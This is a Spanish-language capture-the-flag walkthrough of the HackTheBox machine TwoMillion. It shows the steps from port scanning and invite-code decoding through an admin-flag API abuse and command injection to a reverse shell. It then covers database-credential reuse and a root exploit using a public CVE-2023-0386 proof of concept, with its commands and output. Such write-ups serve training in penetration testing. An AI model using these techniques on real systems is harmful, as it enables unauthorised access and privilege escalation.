---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# ✅ TwoMillion

## Recon <a href="#recon" id="recon"></a>

```bash
nmap -p- --min-rate 10000 10.10.10.11
Starting Nmap 7.80 ( https://nmap.org ) at 2023-06-01 16:59 EDT
Nmap scan report for 2million.htb (10.10.10.11)
Host is up (0.097s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.18 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.10.11
Starting Nmap 7.80 ( https://nmap.org ) at 2023-06-01 17:00 EDT
Nmap scan report for 10.10.10.11
Host is up (0.097s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.19 seconds
```

#### Subdomain <a href="#subdomain-bruteforce" id="subdomain-bruteforce"></a>

`http://2million.htb`

```bash
 ffuf -u http://10.10.10.11 -H "Host: FUZZ.2million.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -ac
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.11
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.2million.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

:: Progress: [4989/4989] :: Job [1/1] :: 408 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
```



`Agregar 2millon.htb al archivo /etc/hosts`

```
10.10.10.11 2million.htb
```

### Website - TCP 8 <a href="#website---tcp-80" id="website---tcp-80"></a>

`login`&#x20;

![image-20230602171248402](https://0xdf.gitlab.io/img/image-20230602171248402.png)

`/invite`:

![image-20230602171346375](https://0xdf.gitlab.io/img/image-20230602171346375.png)

![image-20230606145819478](https://0xdf.gitlab.io/img/image-20230606145819478.png)

**Tech Stack**

Encabezado de HTTP

```bash
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 02 Jun 2023 21:13:15 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 64952
```

![image-20230602171611359](https://0xdf.gitlab.io/img/image-20230602171611359.png)

**Directory Brute Force**

```
feroxbuster -u http://2million.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://2million.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest     
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        7l       11w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://2million.htb/logout => http://2million.htb/
401      GET        0l        0w        0c http://2million.htb/api
405      GET        0l        0w        0c http://2million.htb/api/v1/user/register    
302      GET        0l        0w        0c http://2million.htb/home => http://2million.htb/
200      GET        1l        8w      637c http://2million.htb/js/inviteapi.min.js     
200      GET       94l      293w     4527c http://2million.htb/register
200      GET       80l      232w     3704c http://2million.htb/login
200      GET       46l      152w     1674c http://2million.htb/404
200      GET        5l     1881w   145660c http://2million.htb/js/htb-frontend.min.js
200      GET      260l      328w    29158c http://2million.htb/images/logo-transparent.png
200      GET       96l      285w     3859c http://2million.htb/invite
200      GET       13l     2458w   224695c http://2million.htb/css/htb-frontend.css      
200      GET       13l     2209w   199494c http://2million.htb/css/htb-frontpage.css    
405      GET        0l        0w        0c http://2million.htb/api/v1/user/login          
200      GET       27l      201w    15384c http://2million.htb/images/favicon.png         
200      GET      245l      317w    28522c http://2million.htb/images/logofull-tr-web.png  
200      GET        8l     3162w   254388c http://2million.htb/js/htb-frontpage.min.js 
200      GET     1242l     3326w    64952c http://2million.htb/ 
...[snip]...
```

`/js/inviteapi.min.js`es interesante . Hay un `/register`que proporciona un formulario de registro:



![image-20230602172032579](https://0xdf.gitlab.io/img/image-20230602172032579.png)

### Shell as www-data <a href="#shell-as-www-data" id="shell-as-www-data"></a>

**JavaScript**

En la parte inferior de la página, hay una `<script>`etiqueta que incluye `/js/inviteapi.min.js`:

![image-20230602173705797](https://0xdf.gitlab.io/img/image-20230602173705797.png)

![image-20230602174354605](https://0xdf.gitlab.io/img/image-20230602174354605.png)

De regreso `/invite`(donde se carga este código), abriré las herramientas de desarrollo del navegador y comenzaré a escribir "make" en la consola:

![image-20230602174516201](https://0xdf.gitlab.io/img/image-20230602174516201.png)

Autocompleta esa función como `makeInviteCode`. Lo ejecutaré:

![image-20230602174549106](https://0xdf.gitlab.io/img/image-20230602174549106.png)

**Decodificar datos iniciales**

El JSON sin formato de la respuesta es:

```
{
    "0": 200,
    "success": 1,
    "data": {
        "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr",
        "enctype": "ROT13"
    },
    "hint": "Data is encrypted ... We should probably check the encryption type in order to decrypt it..."
}
```

La pista dice que los datos están cifrados y `encytpe`dice que son ROT13. [rot13.com](https://rot13.com/) es un buen decodificador ROT13:

![image-20230602174803269](https://0xdf.gitlab.io/img/image-20230602174803269.png)

O puedo hacerlo desde la línea de comando con `jq`y `tr`:

```
curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate | jq -r '.data.data' | tr 'a-zA-Z' 'n-za-mN-ZA-M'
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

**Generar codigo**

Para enviar una solicitud POST a `/api/v1/invite/generate`, usaré `curl`. `-X [method]`es cómo especificar el método de solicitud:

```
curl -X POST http://2million.htb/api/v1/invite/generate
{"0":200,"success":1,"data":{"code":"RzZXQUstVDBYNlktUk5CUk0tQUZYUFo=","format":"encoded"}}
```

Para verlo bien, lo agregaré `-s`y lo canalizaré en `jq`:

```
oxdf@hacky$ curl -X POST http://2million.htb/api/v1/invite/generate -s | jq .
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "TUlQU1gtNDRFWkctVVNWVTgtMTk0VUs=",
    "format": "encoded"
  }
}
```

**Código de decodificación**

El resultado esta vez dice que el formato está "codificado". Mirando el `code`, son todos números y letras y terminan en `=`. Eso encaja muy bien con la codificación base64. Intentaré decodificar eso:

```
oxdf@hacky$ echo "TUlQU1gtNDRFWkctVVNWVTgtMTk0VUs=" | base64 -d
MIPSX-44EZG-USVU8-194UK
```

Parece un código de invitación. Puedo probarlo con la `verifyInviteCode`función en la consola de herramientas de desarrollo y me informa que es válido:

![imagen-20230602175237864](https://0xdf.gitlab.io/img/image-20230602175237864.png)

Cuando pongo eso en el formulario `/invite`, me redirige `/register`con el código completado:

![imagen-20230602180134413](https://0xdf.gitlab.io/img/image-20230602180134413.png)

Puedo registrarme aquí e iniciar sesión.

#### Enumeración autenticada <a href="#authenticated-enumeration" id="authenticated-enumeration"></a>

**Sitio web**

Con una cuenta, tengo acceso a lo que parece el sitio web original de HackTheBox:

[![imagen-20230602180451178](https://0xdf.gitlab.io/img/image-20230602180451178.png)](https://0xdf.gitlab.io/img/image-20230602180451178.png)[_Haga clic para ver la imagen completa_](https://0xdf.gitlab.io/img/image-20230602180451178.png)

Dice que el sitio está realizando migraciones de bases de datos y algunas funciones no están disponibles. En realidad, eso significa la mayoría. Los enlaces del Panel de control, las Reglas y el Registro de cambios en "Principal" funcionan y tienen bonitas páginas de retroceso al HTB original.

En "Labs", el único enlace que realmente funciona es la página "Acceso", que conduce a `/home/access`:

[![imagen-20230602180615851](https://0xdf.gitlab.io/img/image-20230602180615851.png)](https://0xdf.gitlab.io/img/image-20230602180615851.png)[_Haga clic para ver la imagen completa_](https://0xdf.gitlab.io/img/image-20230602180615851.png)

Al hacer clic en "Paquete de conexión" y "Regenerar", se devuelve un `.ovpn`archivo. Es una configuración de conexión OpenVPN válida y puedo intentar conectarme con ella, pero no funciona.

**API**

"Paquete de conexión" envía una solicitud GET a `/api/v1/user/vpn/generate`y "Regenerar" envía una solicitud GET a `/api/v1/user/vpn/regenerate`.

Enviaré estas solicitudes a Burp Repeater y jugaré con la API. `/api`devuelve una descripción:

![imagen-20230602181111143](https://0xdf.gitlab.io/img/image-20230602181111143.png)

`/api/v1`devuelve detalles de la API completa:

```
{
  "v1": { 
    "user": {
      "GET": {
        "/api/v1": "Route List",  
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation", 
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

**Enumerar API de administrador**

Como era de esperar, no soy administrador:

![imagen-20230602181807231](https://0xdf.gitlab.io/img/image-20230602181807231.png)

Si intento PUBLICAR en `/api/v1/admin/vpn/generate`, devuelve 401 No autorizado:

![imagen-20230602181939091](https://0xdf.gitlab.io/img/image-20230602181939091.png)

Sin embargo, una solicitud PUT `/api/v1/admin/settings/update`no devuelve 401, sino 200, con un error diferente en el cuerpo:

![imagen-20230602182052397](https://0xdf.gitlab.io/img/image-20230602182052397.png)

#### Obtenga acceso de administrador <a href="#get-admin-access" id="get-admin-access"></a>

Profundizaré un poco más en este punto final. Como dice que el tipo de contenido no es válido, miraré el `Content-Type`encabezado de mi solicitud. No hay ninguno, así que agregaré uno. Como parece que al sitio le gusta JSON, lo configuraré así:

![imagen-20230602182213019](https://0xdf.gitlab.io/img/image-20230602182213019.png)

Ahora dice que falta el correo electrónico. Agregaré eso en el cuerpo en JSON:

![imagen-20230602182248469](https://0xdf.gitlab.io/img/image-20230602182248469.png)

Ahora quiere `is_admin`, así que lo agregaré como `true`:

![imagen-20230602182332129](https://0xdf.gitlab.io/img/image-20230602182332129.png)

Está buscando 0 o 1. Lo configuraré en 1 y parece funcionar:

![imagen-20230602182418615](https://0xdf.gitlab.io/img/image-20230602182418615.png)

Si intento la verificación nuevamente, ¡dice verdadero!

![imagen-20230602182448977](https://0xdf.gitlab.io/img/image-20230602182448977.png)

#### Inyección de comando <a href="#command-injection" id="command-injection"></a>

**Enumerar generar API**

Como mi cuenta ahora es administradora, ya no recibo una respuesta 401 de `/api/v1/admin/vpn/generate`:

![imagen-20230603130348431](https://0xdf.gitlab.io/img/image-20230603130348431.png)

Agregaré mi nombre de usuario y generaré una clave VPN:

![imagen-20230603130429280](https://0xdf.gitlab.io/img/image-20230603130429280.png)

Mi cuenta ahora es administrador.

**Inyección**

Probablemente no sea el código PHP el que genera una clave VPN, sino algunas herramientas Bash que generan la información necesaria para una clave VPN.

Vale la pena comprobar si hay alguna inyección de comando.

Si el servidor está haciendo algo como `gen_vpn.sh [username]`, intentaré poner un `;`nombre de usuario en el nombre de usuario para dividirlo en un nuevo comando. También agregaré un `#`al final para comentar cualquier cosa que pueda surgir después de mi entrada. Funciona:

![imagen-20230603130843584](https://0xdf.gitlab.io/img/image-20230603130843584.png)

**Caparazón**

Para obtener un shell, comenzaré a `nc`escuchar en mi host y colocaré un [shell inverso de bash](https://www.youtube.com/watch?v=OjkVep2EIlw) como nombre de usuario:

![imagen-20230603131015532](https://0xdf.gitlab.io/img/image-20230603131015532.png)

Al enviar esto, recibo un shell en mi `nc`:

```
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.10.11 38542
bash: cannot set terminal process group (1035): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:~/html$
```

Actualizaré el shell usando el [truco](https://www.youtube.com/watch?v=DqE6DxqJg8Q)`script` / :`stty`

```
www-data@2million:~/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@2million:~/html$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@2million:~/html$
```

### Shell como administrador <a href="#shell-as-admin" id="shell-as-admin"></a>

#### Enumeración <a href="#enumeration" id="enumeration"></a>

La raíz web está en la ubicación predeterminada `/var/www/html`:

```
www-data@2million:~/html$ ls -la
total 56
drwxr-xr-x 10 root root 4096 Jun  2 22:30 .
drwxr-xr-x  3 root root 4096 May 26 20:34 ..
drwxr-xr-x  2 root root 4096 May 23 19:37 assets
drwxr-xr-x  2 root root 4096 Jun  2 16:30 controllers
drwxr-xr-x  5 root root 4096 May 29 12:21 css
-rw-r--r--  1 root root 1237 Jun  2 16:15 Database.php
-rw-r--r--  1 root root   87 Jun  2 18:56 .env
drwxr-xr-x  2 root root 4096 May 25 17:57 fonts
drwxr-xr-x  2 root root 4096 May 25 16:23 images
-rw-r--r--  1 root root 2692 Jun  2 18:57 index.php
drwxr-xr-x  3 root root 4096 Jun  1 20:15 js
-rw-r--r--  1 root root 2787 Jun  2 16:15 Router.php
drwxr-xr-x  2 root root 4096 Jun  2 16:15 views
drwxr-xr-x  5 root root 4096 Jun  2 22:30 VPN
```

`index.php`define un montón de rutas para las distintas páginas y puntos finales utilizados en el sitio web.

También hay un `.env`archivo. Este archivo se usa comúnmente en trabajos de marco web PHP para establecer variables de entorno para uso de la aplicación. Esta aplicación es más una falsificación de un `.env`archivo que un uso real en un marco, pero el `.env`archivo sigue teniendo el mismo aspecto:

```
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

#### su/SSH <a href="#su--ssh" id="su--ssh"></a>

Esa contraseña funciona tanto para `su`administrador:

```
www-data@2million:~/html$ su - admin
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:~$
```

Y SSH:

```
oxdf@hacky$ sshpass -p SuperDuperPass123 ssh admin@2million.htb
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.70-051570-generic x86_64)
...[snip]...
You have mail.
...[snip]...
admin@2million:~$
```

De cualquier manera, puedo agarrar `user.txt`:

```
admin@2million:~$ cat user.txt
277c1481************************
```

### Shell como raíz <a href="#shell-as-root" id="shell-as-root"></a>

#### Enumeración <a href="#enumeration-1" id="enumeration-1"></a>

**Correo**

En realidad, este exploit podría llevarse a cabo como www-data. Pero si llego al administrador, hay una pista sobre dónde buscar.

Cuando inicié sesión a través de SSH, había una línea en el banner que decía que el administrador tenía correo. Que se celebra en `/var/mail/admin`:

```
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

También habla de la necesidad de parchear el sistema operativo y menciona un OverlayFS/FUSE CVE.

**Identificar vulnerabilidad**

TwoMillion ejecuta Ubuntu 22.04 con el kernel 5.15.70:

```
admin@2million:~$ uname -a
Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
admin@2million:~$ cat /etc/lsb-release 
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=22.04
DISTRIB_CODENAME=jammy
DISTRIB_DESCRIPTION="Ubuntu 22.04.2 LTS"
```

Una búsqueda de “superposiciones de fusibles de vulnerabilidad del kernel de Linux” limitada al último año arroja un montón de cosas sobre CVE-2023-0386:

![imagen-20230602185030063](https://0xdf.gitlab.io/img/image-20230602185030063.png)

Es un poco difícil determinar exactamente qué versiones se ven afectadas. [Esta página de Ubuntu](https://ubuntu.com/security/CVE-2023-0386) muestra que está arreglado en 5.15.0-70.77:

![imagen-20230602185832675](https://0xdf.gitlab.io/img/image-20230602185832675.png)

No está claro cómo se compara con 5.15.70-051570-generic. Dicho esto, esto se publicó el 22 de marzo de 2023 y la `uname -a`cadena muestra una fecha de compilación del 23 de septiembre de 2022.

#### CVE-2023-0386 <a href="#cve-2023-0386" id="cve-2023-0386"></a>

**Fondo**

[Este blog](https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/) de Datadog hace un muy buen trabajo al analizar los detalles del exploit. El problema tiene que ver con el sistema de archivos superpuesto y cómo se mueven los archivos entre ellos. Para explotar esto, un atacante primero crea un sistema de archivos FUSE (Sistema de archivos en el espacio del usuario) y agrega un binario que pertenece al ID de usuario 0 en ese sistema de archivos y tiene el bit SetUID establecido. El error en OverlayFS permite que ese archivo se copie de FUSE FS al archivo principal manteniendo su propietario y SetUID.

**Explotar**

Hay una [prueba de concepto para este exploit](https://github.com/xkaneiki/CVE-2023-0386) en GitHub del investigador xkaneiki. Es `README.md`escaso, pero proporciona suficientes instrucciones de uso.

Descargaré la versión ZIP del repositorio:

![imagen-20230602190651754](https://0xdf.gitlab.io/img/image-20230602190651754.png)

Lo subiré a 2millones con `scp`:

```
oxdf@hacky$ sshpass -p SuperDuperPass123 scp CVE-2023-0386-main.zip admin@2million.htb:/tmp/
```

Necesitaré dos shells en 2 millones, lo cual es fácil de hacer con SSH. Descomprimiré el exploit, iré a la carpeta y lo ejecutaré `make all`como dice en `README.md`:

```
admin@2million:/tmp$ unzip CVE-2023-0386-main.zip 
Archive:  CVE-2023-0386-main.zip
c4c65cefca1365c807c397e953d048506f3de195
   creating: CVE-2023-0386-main/
  inflating: CVE-2023-0386-main/Makefile  
...[snip]...
  inflating: CVE-2023-0386-main/test/mnt.c  
admin@2million:/tmp$ cd CVE-2023-0386-main/
admin@2million:/tmp/CVE-2023-0386-main$ make all
gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
fuse.c: In function ‘read_buf_callback’:
fuse.c:106:21: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘off_t’ {aka ‘long int’} [-Wformat=]
  106 |     printf("offset %d\n", off);
      |                    ~^     ~~~
...[snip]..
/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/11/../../../x86_64-linux-gnu/libfuse.a(fuse.o): in function `fuse_new_common':
(.text+0xaf4e): warning: Using 'dlopen' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking
gcc -o exp exp.c -lcap
gcc -o gc getshell.c
```

Genera algunos errores, pero ahora hay tres archivos binarios que no estaban allí antes:

```
admin@2million:/tmp/CVE-2023-0386-main$ ls
exp  exp.c  fuse  fuse.c  gc  getshell.c  Makefile  ovlcap  README.md  test
```

En la primera sesión, ejecutaré el siguiente comando de las instrucciones:

```
admin@2million:/tmp/CVE-2023-0386-main$ ./fuse ./ovlcap/lower ./gc
[+] len of gc: 0x3ee0
```

Se cuelga.

En la otra ventana, ejecutaré el exploit:

```
admin@2million:/tmp/CVE-2023-0386-main$ ./exp 
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Jun  2 23:11 .
drwxrwxr-x 6 root   root     4096 Jun  2 23:11 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:/tmp/CVE-2023-0386-main#
```

¡Ese es un shell raíz!

Voy a agarrar `root.txt`:

```
root@2million:/root# cat root.txt
05636c51************************
```
